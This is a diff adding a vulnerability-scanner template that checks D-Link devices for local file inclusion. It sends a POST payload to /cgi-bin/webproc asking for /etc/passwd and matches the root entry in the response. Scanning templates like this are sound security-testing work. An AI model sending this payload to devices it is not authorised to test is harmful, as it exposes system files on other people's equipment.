@@ -1,0 +1,23 @@
+id: dlink-file-read
+name: D-Link - Local File Inclusion
+severity: high
+confidence: tentative
+description: D-Link is vulnerable to local file inclusion.
+reference: CWE-522
+tags:
+- dlink
+- lfi
+- misconfig
+- vuln
+requests:
+- method: POST
+  path: /cgi-bin/webproc
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
+  body: errorpage=/etc/passwd&obj-action=auth&:action=login
